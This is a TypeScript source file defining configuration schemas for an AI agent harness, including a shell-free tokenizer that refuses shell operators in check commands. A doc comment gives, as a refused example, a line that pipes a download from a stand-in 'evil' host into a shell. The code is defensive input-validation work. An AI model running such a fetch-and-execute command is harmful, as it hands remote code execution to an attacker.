import { z } from "zod";
import { VENDOR_REGISTRY, vendorIdSchema } from "./vendor.js";
import { laneProfileSchema } from "./lane-profile.js";
import type { MemoryFilter } from "./memory-filter.js";
import { loopKindSchema } from "./workflow.js";

/**
 * Harness v1 exposes only implemented loop modes. Derive this allowlist from
 * the shared workflow enum so future additions cannot widen harnesses silently.
 */
export const harnessLoopKindSchema = loopKindSchema.extract([
  "check_repair",
  "critique_patch",
]);
export type HarnessLoopKind = z.infer<typeof harnessLoopKindSchema>;

/**
 * A success criterion run after (or inside a loop around) a harnessed run.
 *
 * `command` + optional `args` is the argv form (P3-B): the check-runner spawns
 * `command` with `args` and NO shell, so a metacharacter in a string is never
 * evaluated. When `args` is omitted, `command` is a legacy string that is split
 * by the SAFE tokenizer below (`resolveCheckArgv`), which REFUSES shell
 * operators rather than handing them to /bin/sh. Prefer the explicit `args`
 * form for anything non-trivial.
 */
export const harnessCheckSchema = z.object({
  name: z.string().min(1),
  command: z.string().min(1),
  /** Explicit argv (argv[1..]); when present, `command` is the bare program. */
  args: z.array(z.string()).optional(),
});
export type HarnessCheck = z.infer<typeof harnessCheckSchema>;

/**
 * Raised when a check command string cannot be run without a shell, either it
 * relies on a shell operator (pipe/redirect/chain/subshell) or is malformed.
 * The check-runner turns this into a FAILED check with a clear reason; it never
 * falls back to a shell.
 */
export class CheckCommandError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "CheckCommandError";
  }
}

// Shell operators that only mean anything to /bin/sh. Under `shell:false` they
// would be inert literals, but a command that contains them was written for a
// shell, running it as a single argv would silently do the wrong thing, so we
// REFUSE it (fail loud) and ask the author to use argv/args or a script.
const SHELL_OPERATOR_CHARS = new Set(["|", "&", ";", "<", ">", "`", "(", ")"]);

/**
 * Quote-aware, shell-free tokenizer (P3-B). Splits a check command string into
 * an argv array WITHOUT ever invoking /bin/sh, and REFUSES any command that
 * carries an (unquoted) shell operator, `| & ; < > \` ( )`, `$(`, `&&`, `||`,
 * or a newline, with a clear {@link CheckCommandError}. Single/double quotes
 * group a token (so `--filter "a b"` stays one arg) and are stripped; their
 * contents are literal and never treated as operators. `npm test` →
 * `["npm","test"]`; `echo hi && curl evil|sh` → refused.
 */
export function parseCheckCommand(command: string): string[] {
  if (/[\n\r]/.test(command)) {
    throw new CheckCommandError(
      "Check command must be a single line (newlines are a shell construct)."
    );
  }
  const argv: string[] = [];
  let current = "";
  let hasToken = false;
  let quote: '"' | "'" | null = null;

  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i];
    if (quote) {
      if (ch === quote) {
        quote = null;
      } else {
        current += ch;
      }
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      hasToken = true;
      continue;
    }
    if (ch === " " || ch === "\t") {
      if (hasToken) {
        argv.push(current);
        current = "";
        hasToken = false;
      }
      continue;
    }
    if (ch === "$" && command[i + 1] === "(") {
      throw refuseOperator("$(", command);
    }
    if (SHELL_OPERATOR_CHARS.has(ch)) {
      throw refuseOperator(ch, command);
    }
    current += ch;
    hasToken = true;
  }

  if (quote) {
    throw new CheckCommandError(
      `Check command has an unterminated ${quote === '"' ? "double" : "single"} quote: ${command}`
    );
  }
  if (hasToken) {
    argv.push(current);
  }
  if (argv.length === 0) {
    throw new CheckCommandError("Check command is empty.");
  }
  return argv;
}

function refuseOperator(operator: string, command: string): CheckCommandError {
  return new CheckCommandError(
    `Check command contains a shell operator ('${operator}') and cannot run without a shell: ${command}. ` +
      `Checks run as a bare argv (no /bin/sh), express it as a single program with arguments ` +
      `(prefer the harness check 'args' array), or move the pipeline into a script and call that.`
  );
}

/**
 * Resolve a {@link HarnessCheck} to the argv the check-runner will spawn. The
 * explicit `args` form is used verbatim (the author opted into a shell-free
 * invocation); a legacy `command` string is run through {@link parseCheckCommand}.
 */
export function resolveCheckArgv(check: {
  command: string;
  args?: string[];
}): string[] {
  if (check.args && check.args.length > 0) {
    return [check.command, ...check.args];
  }
  return parseCheckCommand(check.command);
}

/**
 * Capabilities a harness needs from its lane. Validated at dispatch against
 * the lane's adapter capabilities so unsupported combinations fail fast and
 * honestly (WIKI: honest lane asymmetry) instead of degrading silently.
 */
export const harnessRequiresSchema = z.object({
  interactive: z.boolean().default(false),
  worktree: z.boolean().default(false),
  /**
   * MUON tools this harness's work genuinely needs (feature #10). A harness
   * whose whole value is "judge this against the code graph" is not doing that
   * job without `code_query`; saying so here lets dispatch NAME the gap instead
   * of letting the agent quietly fall back to grep.
   *
   * Declarative only — it grants nothing. The capability mode still decides
   * what the agent actually receives, so listing a tool here can never widen a
   * tier (ADR-0022: authority is granted positively, in one place).
   */
  tools: z.array(z.string().min(1).max(64)).max(32).default([]),
});
export type HarnessRequires = z.infer<typeof harnessRequiresSchema>;

/** Hard execution bounds. Cost budgets are out of scope: vendors do not expose spend. */
export const harnessBudgetSchema = z.object({
  maxWallMs: z.number().int().positive().optional(),
  maxTurns: z.number().int().positive().optional(),
  maxIterations: z.number().int().min(1).max(10).optional(),
});
export type HarnessBudget = z.infer<typeof harnessBudgetSchema>;

export const evaluatorSpecSchema = z.object({
  /**
   * WAVE E: a POSITIVE capability check against `authority.evaluator` rather
   * than a hand-written pair. Not a bare widening to every vendor id — a vendor
   * that has not earned the ADR-0018 critique authority is refused here, which
   * is stricter than the literal was for any id it did not happen to name.
   */
  laneKey: vendorIdSchema
    .refine((vendor) => VENDOR_REGISTRY[vendor].authority.evaluator, {
      message: "lane is not authorized to run the evaluator loop",
    })
    .optional(),
  criteria: z.string().min(1).max(8_000),
  model: z.string().min(1).max(200).optional(),
  maxDiffBytes: z.number().int().positive().max(1_000_000).default(64_000),
  timeoutMs: z.number().int().positive().max(600_000).default(120_000),
});
export type EvaluatorSpec = z.infer<typeof evaluatorSpecSchema>;

/**
 * Which slice of shared memory gets prepended to briefs dispatched with this
 * harness.
 *
 * `topics` / `modules` NARROW the slice: when either is non-empty, only notes
 * carrying at least ONE of the listed coordinates (exact element match, the
 * `MemoryFilter` stringList `in` semantics) survive into the brief. Both lists
 * empty — the default — means no narrowing, byte-identical to the pre-filter
 * behaviour. The two lists are a UNION, not an intersection: a note qualifies
 * by topic OR by module, because a harness names every coordinate it cares
 * about and demanding both on one note would silently empty most slices.
 *
 * Bounds mirror the R5 filter grammar the values are compiled into
 * (`MEMORY_FILTER_MAX_LIST_LENGTH` 32 elements, value length ≤ 256), so an
 * over-limit harness fails loudly at CONFIG time, never silently at dispatch.
 */
export const memorySliceSpecSchema = z.object({
  topics: z.array(z.string().min(1).max(256)).max(32).default([]),
  modules: z.array(z.string().min(1).max(256)).max(32).default([]),
  k: z.number().int().min(1).max(20).default(5),
});
export type MemorySliceSpec = z.infer<typeof memorySliceSpecSchema>;

/**
 * Compile a harness's memory-slice spec into the ONE bounded filter grammar
 * every memory read shares (R5, `memory-filter.ts`) — never a second dialect.
 * Empty spec → `undefined`, so the default harness reads exactly as before.
 *
 * The filter is a NARROWER over a set the caller was already authorized to
 * receive (the grammar's own load-bearing property #2): compiling harness
 * coordinates into it can only remove notes from the slice, never widen a
 * read, so no new authority is created here.
 */
export function memorySliceFilter(
  spec: MemorySliceSpec
): MemoryFilter | undefined {
  const conditions: MemoryFilter[] = [];
  if (spec.topics.length > 0) {
    conditions.push({ field: "topics", op: "in", value: spec.topics });
  }
  if (spec.modules.length > 0) {
    conditions.push({ field: "modules", op: "in", value: spec.modules });
  }
  if (conditions.length === 0) {
    return undefined;
  }
  return conditions.length === 1 ? conditions[0] : { or: conditions };
}

/**
 * Harness: a named, reusable execution constraint bundle around a specialist
 * (VISION §4). `profileOverlay` is merged over the lane's stored profile at
 * dispatch (overlay wins); checks/budget/memorySlice constrain how the run is
 * verified, bounded, and briefed. `preauthorizedTools` is the only pre-auth
 * path, everything outside it stays must-ask through the approvals inbox.
 */
export const harnessConfigSchema = z
  .object({
    description: z.string().default(""),
    laneKey: z.string().min(1).optional(),
    profileOverlay: laneProfileSchema.partial().default({}),
    checks: z.array(harnessCheckSchema).default([]),
    requires: harnessRequiresSchema.default({
      interactive: false,
      worktree: false,
      // A harness that declares nothing needs nothing: the default must stay
      // EMPTY, so no existing harness starts reporting a gap it never had.
      tools: [],
    }),
    preauthorizedTools: z.array(z.string()).default([]),
    budget: harnessBudgetSchema.default({}),
    loopKind: harnessLoopKindSchema.default("check_repair"),
    evaluator: evaluatorSpecSchema.optional(),
    memorySlice: memorySliceSpecSchema.default({ topics: [], modules: [], k: 5 }),
    /** TODO 4.19 — reference jobs read memory but must not fill the review queue. */
    memoryCapture: z.enum(["mine", "reference"]).default("mine"),
  })
  .superRefine((value, ctx) => {
    const hasEvaluator = value.evaluator !== undefined;
    if ((value.loopKind === "critique_patch") !== hasEvaluator) {
      ctx.addIssue({
        code: "custom",
        message: "critique_patch requires exactly one evaluator configuration",
      });
    }
    if (hasEvaluator && !value.requires.worktree) {
      ctx.addIssue({
        code: "custom",
        message: "Evaluator harnesses require an isolated worktree",
      });
    }
  });
export type HarnessConfig = z.infer<typeof harnessConfigSchema>;

export const emptyHarnessConfig: HarnessConfig = harnessConfigSchema.parse({});
